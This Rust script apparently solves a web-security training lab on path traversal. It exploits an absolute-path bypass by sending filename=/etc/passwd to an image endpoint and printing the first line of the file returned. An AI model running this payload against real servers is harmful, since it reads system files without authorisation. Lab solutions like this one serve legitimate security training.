/*********************************************************************
*
* Lab: File path traversal, traversal sequences blocked with
*      absolute path bypass
*
* Hack Steps: 
*      1. Inject payload into 'filename' query parameter to retrieve
*         the content of /etc/passwd
*      2. Extract the first line as a proof
*
**********************************************************************/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a90007a033373e681d0ada10059003b.web-security-academy.net";

fn main() {
    println!("⦗#⦘ Injection parameter: {}", "filename".yellow());
    print!("⦗1⦘ Injecting payload to retrieve the content of /etc/passwd.. ");
    io::stdout().flush().unwrap();

    let payload = "/etc/passwd";
    let fetch_with_payload = fetch(&format!("/image?filename={payload}"));

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the first line as a proof.. ");

    let body = fetch_with_payload.text().unwrap();
    let first_line = capture_pattern_from_text("(.*)\n", &body);

    println!("{} => {}", "OK".green(), first_line.yellow());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn fetch(path: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}
